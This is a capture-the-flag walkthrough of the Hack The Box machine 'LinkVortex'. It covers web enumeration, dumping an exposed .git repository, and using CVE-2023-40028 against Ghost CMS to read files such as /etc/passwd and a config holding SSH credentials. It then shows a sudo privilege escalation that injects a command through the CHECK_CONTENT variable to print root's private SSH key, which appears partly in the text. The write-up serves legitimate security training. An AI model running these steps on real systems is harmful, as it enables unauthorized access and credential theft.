![logo](logo.jpeg)


<br>

This box on Hack The Box was labeled "easy," so I started with enumeration focusing on hidden files, contents, and subdomains since the nmap scan results were minimal. During subdomain enumeration, I discovered a hidden .git directory. Using the git-dumper tool, I dumped the repository and began analyzing its contents, looking for useful information.

Eventually, I found some passwords, including one for the admin user, but they were useless without the corresponding usernames. Continuing my investigation in the dumped files, I identified the exact version of the Ghost CMS being used. It was version 5.59.0,  which is known to have a vulnerability that allows authenticated users to upload malicious symlinks files.

Next, I searched for a proof-of-concept exploit and quickly found one shared by the box creator on their GitHub account. I modified the exploit, aiming for Remote Code Execution (RCE). However, the vulnerability only allowed arbitrary file reads, as unauthenticated users could upload symlinks, leading to arbitrary file read vulnerabilities. While it didn't lead directly to RCE, we can leveraged the exploit chain to extract the user's SSH private key. Eventually, after examining configuration files, I obtained the SSH credentials, granting me initial access.

Gaining privilege escalation on this machine is pretty straightforward. During our enumeration inside on target machine, we found a misconfigured environment variable, env_keep+=CHECK_CONTENT, that we can take advantage of. By setting up our own symbolic links and using this variable, we’re able to extract the root’s private SSH key.


<br>
<br>


![recon1](recon1.png)
![sitemap](sitemap.png)
![sub](sub.png)
## Curl
```bash
curl 10.10.11.47
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://linkvortex.htb/">here</a>.</p>
</body></html>
```

## Debugging contents
```bash
curl -v http://linkvortex.htb                                                                                          
* Host linkvortex.htb:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.47
*   Trying 10.10.11.47:80...
* Connected to linkvortex.htb (10.10.11.47) port 80
* using HTTP/1.x
> GET / HTTP/1.1
> Host: linkvortex.htb
> User-Agent: curl/8.10.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Mon, 09 Dec 2024 02:16:03 GMT
< Server: Apache
< X-Powered-By: Express
< Cache-Control: public, max-age=0
< Content-Type: text/html; charset=utf-8
< Content-Length: 12148
< ETag: W/"2f74-qPbqXtFXOvAaVwEfFzMM8D+Xyr0"
< Vary: Accept-Encoding
< 
<!DOCTYPE html>
<html lang="en">
<head>

    <title>BitByBit Hardware</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=e1bcf8157e" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=e1bcf8157e" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=e1bcf8157e" />

    <meta name="description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <link rel="canonical" href="http://linkvortex.htb/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="BitByBit Hardware">
    <meta property="og:type" content="website">
    <meta property="og:title" content="BitByBit Hardware">
    <meta property="og:description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <meta property="og:url" content="http://linkvortex.htb/">
    <meta property="article:publisher" content="https://www.facebook.com/ghost">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="BitByBit Hardware">
    <meta name="twitter:description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <meta name="twitter:url" content="http://linkvortex.htb/">
    <meta name="twitter:site" content="@ghost">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "WebSite",
    "publisher": {
        "@type": "Organization",
        "name": "BitByBit Hardware",
        "url": "http://linkvortex.htb/",
        "logo": {
            "@type": "ImageObject",
            "url": "http://linkvortex.htb/favicon.ico"
        }
    },
    "url": "http://linkvortex.htb/",
    "mainEntityOfPage": "http://linkvortex.htb/",
    "description": "Your trusted source for detailed, easy-to-understand computer parts info"
}
    </script>

    <meta name="generator" content="Ghost 5.58">
    <link rel="alternate" type="application/rss+xml" title="BitByBit Hardware" href="http://linkvortex.htb/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="054f7096476b0e8c7ec591c72c" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="http://linkvortex.htb/" crossorigin="anonymous"></script>
    
    <link href="http://linkvortex.htb/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=e1bcf8157e"></script><style>:root {--ghost-accent-color: #1c1719;}</style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=e1bcf8157e">

</head>
<body>
...
...
```

## Nmap 
```bash
nmap -sC -sV -p$(nmap --min-rate=2000 -T4 -p- 10.10.11.47 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') 10.10.11.47
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 10:13 PST
Nmap scan report for 10.10.11.47
Host is up (0.32s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.18 seconds
                                                                            
```
## CMS
```bash

 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  CMS Scan Results  [+] 

 ┏━Target: linkvortex.htb
 ┃
 ┠── CMS: Ghost CMS
 ┃    │
 ┃    ╰── URL: https://ghost.org
 ┃
 ┠── Result: /home/l0n3m4n/tools/recon-enum/CMSeeK/Result/linkvortex.htb/cms.json
 ┃
 ┗━Scan Completed in 0.74 Seconds, using 1 Requests

```

## Domain file enumeration  
```bash
$ feroxbuster -u http://linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt  --scan-dir-listings 
                                                                                                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://linkvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       27w     6743c http://linkvortex.htb/public/cards.min.js
200      GET        2l      157w    10332c http://linkvortex.htb/assets/built/casper.js
200      GET        1l      583w    35739c http://linkvortex.htb/public/cards.min.css
200      GET        2l      769w    39700c http://linkvortex.htb/assets/built/screen.css
200      GET        2l       46w    25518c http://linkvortex.htb/favicon.ico
404      GET      188l      529w     7361c http://linkvortex.htb/assets/built/
404      GET      188l      529w     7361c http://linkvortex.htb/assets/
404      GET      188l      529w     7361c http://linkvortex.htb/public/
404      GET      188l      529w     7361c http://linkvortex.htb/text/
200      GET      307l      914w    12148c http://linkvortex.htb/

```
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://linkvortex.htb/FUZZ -fw 1 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

LICENSE                 [Status: 200, Size: 1065, Words: 149, Lines: 23, Duration: 1124ms]
assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 387ms]
favicon.ico             [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 995ms]
partials                [Status: 301, Size: 183, Words: 7, Lines: 11, Duration: 371ms]
robots.txt              [Status: 200, Size: 121, Words: 7, Lines: 7, Duration: 1080ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 454ms]
sitemap.xml             [Status: 200, Size: 527, Words: 6, Lines: 1, Duration: 297ms]
:: Progress: [20476/20476] :: Job [1/1] :: 107 req/sec :: Duration: [0:05:39] :: Errors: 0 ::
                                                                                                
```

## Subdomain 
```bash
 ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://linkvortex.htb -H "HOST: FUZZ.linkvortex.htb" -fw 14 -c 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 14
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 320ms]
:: Progress: [4989/4989] :: Job [1/1] :: 134 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

## Subdomain file enumeration
```bash
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt  -u http://dev.linkvortex.htb/FUZZ               

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 3891ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 3897ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 3897ms]
cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 307ms]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 298ms]
:: Progress: [20476/20476] :: Job [1/1] :: 87 req/sec :: Duration: [0:05:00] :: Errors: 72 ::

```
```bash
feroxbuster -u http://dev.linkvortex.htb -w /usr/share/seclists/Discovery/Web-Content/big.txt --scan-dir-listings 
                                                                                                                                                                         
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://dev.linkvortex.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/big.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 📂  Scan Dir Listings     │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404     GET    Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403     GET    Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200     GET    http://dev.linkvortex.htb/
301     GET    http://dev.linkvortex.htb/.git => http://dev.linkvortex.htb/.git/
200     GET    http://dev.linkvortex.htb/.git/description
200     GET    http://dev.linkvortex.htb/.git/packed-refs
200     GET    http://dev.linkvortex.htb/.git/config
200     GET    http://dev.linkvortex.htb/.git/shallow
200     GET    http://dev.linkvortex.htb/.git/HEAD
200     GET    http://dev.linkvortex.htb/.git/logs/HEAD
200     GET    http://dev.linkvortex.htb/.git/hooks/post-update.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/commit-msg.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/update.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/pre-push.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/pre-commit.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/pre-receive.sample
200     GET    http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample
200     GET    http://dev.linkvortex.htb/.git/info/exclude
200     GET    http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec
301     GET    http://dev.linkvortex.htb/.git/hooks => http://dev.linkvortex.htb/.git/hooks/
301     GET    http://dev.linkvortex.htb/.git/logs => http://dev.linkvortex.htb/.git/logs/
200     GET    http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000
200     GET    http://dev.linkvortex.htb/.git/refs/tags/v5.57.3
301     GET    http://dev.linkvortex.htb/.git/refs => http://dev.linkvortex.htb/.git/refs/
301     GET    http://dev.linkvortex.htb/.git/objects => http://dev.linkvortex.htb/.git/objects/
301     GET    http://dev.linkvortex.htb/.git/info => http://dev.linkvortex.htb/.git/info/
301     GET    http://dev.linkvortex.htb/.git/objects/pack => http://dev.linkvortex.htb/.git/objects/pack/
301     GET    http://dev.linkvortex.htb/.git/objects/50 => http://dev.linkvortex.htb/.git/objects/50/
301     GET    http://dev.linkvortex.htb/.git/objects/e6 => http://dev.linkvortex.htb/.git/objects/e6/
200     GET    http://dev.linkvortex.htb/.git/index
200     GET    http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx
301     GET    http://dev.linkvortex.htb/.git/refs/tags => http://dev.linkvortex.htb/.git/refs/tags/
200     GET    http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack
```

## Dump .git contents
```bash
# This will download the entire .git directory to a folder named repo-dump.
$ wget --mirror --no-parent http://dev.linkvortex.htb/.git/ -P ./repo-dump

# clone git-dumper tool
$ git clone https://github.com/arthaud/git-dumper.git 

# usage tool
$ python3 git-dumper.py http://dev.linkvortex.htb/.git ./dumped-repo
```

## Locate password string 
```bash
grep -rn --include="*.js" "password" repo-dump          
```
```bash
# user credentials
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:56:            const password = 'OctopiFociPilfer45';
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:69:                        password,
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:105:            await agent.loginAs(email, password);
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:147:                        password: 'thisissupersafe',
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:173:                        password: 'thisissupersafe',
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:195:            const password = 'thisissupersafe';
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:208:                        password,
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:244:            await cleanAgent.loginAs(email, password);
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:299:                        password: 'lel123456',
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:317:                        password: '12345678910',
repo-dump/ghost/core/test/regression/api/admin/authentication.test.js:340:                        password: '12345678910',
```
```bash
 const password = 'OctopiFociPilfer45';
```
![pass](pass.png)
 
## Vulnerability Identification
```bash
$ cat config            
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = https://github.com/TryGhost/Ghost.git
	fetch = +refs/tags/v5.58.0:refs/tags/v5.58.0
```
```bash
$ sploitscan CVE-2023-40028

███████╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗ ██████╗ █████╗ ███╗   ██╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔════╝██╔══██╗████╗  ██║
███████╗██████╔╝██║     ██║   ██║██║   ██║   ███████╗██║     ███████║██╔██╗ ██║
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   ╚════██║██║     ██╔══██║██║╚██╗██║
███████║██║     ███████╗╚██████╔╝██║   ██║   ███████║╚██████╗██║  ██║██║ ╚████║
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝
v0.10.5 / Alexander Hagenah / @xaitax / ah@primepage.de

╔════════════════════════╗
║ CVE ID: CVE-2023-40028 ║
╚════════════════════════╝

┌───[ 🔍 Vulnerability information ]
|
├ Published:   2023-08-15
├ Base Score:  4.9 (MEDIUM)
├ Vector:      CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
└ Description: Ghost is an open source content management system. Versions prior to 5.59.1 are subject to a
               vulnerability which allows authenticated users to upload files that are symlinks.
               This can be exploited to perform an arbitrary file read of any file on the host
               operating system. Site administrators can check for exploitation of this issue by
               looking for unknown symlinks within Ghost's `content/` folder. Version 5.59.1
               contains a fix for this issue. All users are advised to upgrade. There are no known
               workarounds for this vulnerability.

┌───[ ♾️ Exploit Prediction Score (EPSS) ]
|
└ EPSS Score:  0.07% Probability of exploitation.

┌───[ 🛡️ CISA KEV Catalog ]
|
└ ❌ No data found.

┌───[ 💣 Public Exploits (Total: 0) ]
|
│
└ Other
   └ PacketStorm: https://packetstormsecurity.com/search/?q=CVE-2023-40028

┌───[ 🕵️ HackerOne Hacktivity ]
|
├ Rank:        7347
├ Reports:     0
└ Severity:    Unknown: 0 / None: 0 / Low: 0 / Medium: 0 / High: 0 / Critical: 0

┌───[ 🤖 AI-Powered Risk Assessment ]
|
|                                     
| ❌ OpenAI API key is not configured correctly.
|
└────────────────────────────────────────

┌───[ ⚠️ Patching Priority Rating ]
|
└ Priority:     D

┌───[ 📚 Further References ]
|
├ https://github.com/TryGhost/Ghost/security/advisories/GHSA-9c9v-w225-v5rg
└ https://github.com/TryGhost/Ghost/commit/690fbf3f7302ff3f77159c0795928bdd20f41205
```
![creator](creator.png)
## Searching PoC 
> first i try to search creator github luckily i    found his github account 
![github](github.png)

![email](email.png)
## Initial access
> https://github.com/0xyassine/CVE-2023-40028
```bash
$ ./exploit.sh  -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
```
## SSH credential
```bash
$ find / -name "config.production.json" 2>/dev/null
```
```bash
$ ./exploit.sh  -u admin@linkvortex.htb -p OctopiFociPilfer45
WELCOME TO THE CVE-2023-40028 SHELL
file> /var/lib/ghost/config.production.json
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
file> 

```
## User flag
```bash
2fa4affc2ba7f1e055a0b16641b5c3a0
```
## Privilege escalation
```bash
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
bob@linkvortex:~$ 

bob@linkvortex:~$ ln -s bobbob.png /tmp/bob.png

bob@linkvortex:~$ ln -s /root/.ssh/id_rsa /tmp/bobbob.png

bob@linkvortex:~$ export CHECK_CONTENT='/bin/cat /root/.ssh/id_rsa'

bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/bob.png

/opt/ghost/clean_symlink.sh: line 5: [: /bin/cat: binary operator expected
Link found [ /tmp/bob.png ] , moving it to quarantine
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
6sKpMThUctYpWnzAc4yBN/mavhY7v5+TEV0FzPYZJ2spoeB3OGBcVNzSL41ctOiqGVZ7yX
...
...
REDACTED
...
...
+20m3kb27t8TQT5a/B7UW7UlcT61HdmGO7nKGJuydhobj7gbOvBJ6u6PlJyjxRt/bT601G
QMYCJ4zSjvxSyFaG1a0KolKuxa/9+OKNSvulSyIY/N5//uxZcOrI5hV20IiH580MqL+oU6
lM0jKFMrPoCN830kW4XimLNuRP2nar+BXKuTq9MlfwnmSe/grD9V3Qmg3qh7rieWj9uIad
1G+1d3wPKKT0ztZTPauIZyWzWpOwKVAAAAwQDKF/xbVD+t+vVEUOQiAphz6g1dnArKqf5M
SPhA2PhxB3iAqyHedSHQxp6MAlO8hbLpRHbUFyu+9qlPVrj36DmLHr2H9yHa7PZ34yRfoy
+UylRlepPz7Rw+vhGeQKuQJfkFwR/yaS7Cgy2UyM025EEtEeU3z5irLA2xlocPFijw4gUc
xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-----END OPENSSH PRIVATE KEY-----
Content:
bob@linkvortex:~$ 
```

## Clean-up format id_rsa key
```bash
import re

def clean_ssh_key(key: str) -> str:
    key = key.strip()
    
    header = "-----BEGIN OPENSSH PRIVATE KEY-----"
    footer = "-----END OPENSSH PRIVATE KEY-----"
    
    if not key.startswith(header) or not key.endswith(footer):
        raise ValueError("Invalid OpenSSH key format")
    
    content = key[len(header):-len(footer)].strip()
    content = re.sub(r'\s+', '', content)
    formatted_content = "\n".join(content[i:i+64] for i in range(0, len(content), 64))
    cleaned_key = f"{header}\n{formatted_content}\n{footer}"
    return cleaned_key

def main():
    # Example input
    raw_key = """
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
    q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
    V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
    6sKpMThUctYpWnzAc4yBN/mavhY7v5+TEV0FzPYZJ2spoeB3OGBcVNzSL41ctOiqGVZ7yX
    -----------------------[ paster your key ]---------------------------
    6rniGe8h1bMOY9HnqpRfDrx0/NcG0uaMyQYLY8cklq0ZJCgHGNdbZE5Z+jSgrLEcz9a/ZG
    5oB7MApRKxyy/wmgW/9OIOuQNMREgLeR9cLkl4JoqWU/DKueJWeGTTID4ud482W2hxhwAh
    sS4KwSubuJhd7y30httOopQIFNbFBE3ZFc/MGLkG9kuArdAE9eKG5o3u6KktHAalRGPP5u
    qJWGn/1PHcBP8PW3qLB+k+2qxFMJ4QAAAAMBAAEAAAGABtJHSkyy0pTqO+Td19JcDAxG1b
    -----END OPENSSH PRIVATE KEY-----
    """
    try:
        cleaned_key = clean_ssh_key(raw_key)
        print("Cleaned Key:")
        print(cleaned_key)
    except ValueError as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
``` 

## Gaining Root
```bash
$ ssh -i id_rsa root@linkvortex.htb                               
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

 

root@linkvortex:~# id
uid=0(root) gid=0(root) groups=0(root)
root@linkvortex:~# ls
root.txt

root@linkvortex:~# cat root.txt
7e29188703608029a1b5087438e00413

root@linkvortex:~# 
```
